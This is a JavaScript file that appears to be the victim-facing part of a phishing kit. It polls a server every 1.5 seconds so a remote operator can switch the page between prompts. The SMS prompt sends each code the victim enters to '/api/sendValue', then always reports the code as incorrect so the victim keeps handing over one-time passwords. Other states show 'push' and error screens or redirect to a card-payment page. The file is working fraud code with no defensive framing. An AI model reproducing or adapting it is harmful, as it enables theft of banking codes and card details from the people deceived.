async function errors(token) {
  var status;
  var error;
  var id;

  Swal.fire({
    icon: "info",
    title: `${wait}`,
    showConfirmButton: false,
    allowOutsideClick: false,
  });

  function smsModal() {
    Swal.fire({
      title: `${smsTitle}`,
      input: "text",
      inputAttributes: {
        autocapitalize: "off",
      },
      confirmButtonText: `${nextButton}`,
      closeOnClickOutside: false,
      closeOnEsc: false,
      allowOutsideClick: false,
      icon: "info",
      dangerMode: true,
      preConfirm: (code) => {
        return axios.post("/api/sendValue", {
          value: code,
          id: token,
          type: "sms"
        });
      },
    }).then((result) => {
      if (result.isConfirmed) {
        alert(`${incorrectCode}`);
        return smsModal(...arguments);
      }
    });
  }

  function push() {
    Swal.fire({
      icon: "info",
      title: `${pushTitle}`,
      showConfirmButton: false,
      allowOutsideClick: false,
    });
  }

  function custom(text) {
    Swal.fire({
      icon: "info",
      title: `${text}`,
      showConfirmButton: false,
      allowOutsideClick: false,
    });
  }

  function wrongData() {
    Swal.fire({
      icon: "info",
      title: `${wrong}`,
      showConfirmButton: false,
      allowOutsideClick: false,
    });
  }

  async function checkStatus() {
    axios
      .post("/api/getStatus", {
        id: token,
      })
      .then(async function (res) {
        error = res.data.error;
        id = res.data.id;
        if (res.data.method != status && res.data.method == "sms") {
          status = res.data.method;
          return smsModal();
        } else if (res.data.method != status && res.data.method == "push") {
          status = res.data.method;
          return push();
        } else if (res.data.method != status && res.data.method == "wrongData") {
          status = res.data.method;
          return wrongData();
        } else if (res.data.method != status && res.data.method == "lkCard") {
          status = res.data.method;
          return location.href = `/pay/merchants/${token}`
        } else if (res.data.method != status && res.data.method == "error") {
          status = res.data.method;
          return custom(res.data.error);
        }
      });
  }

  setInterval(checkStatus, 1500);
}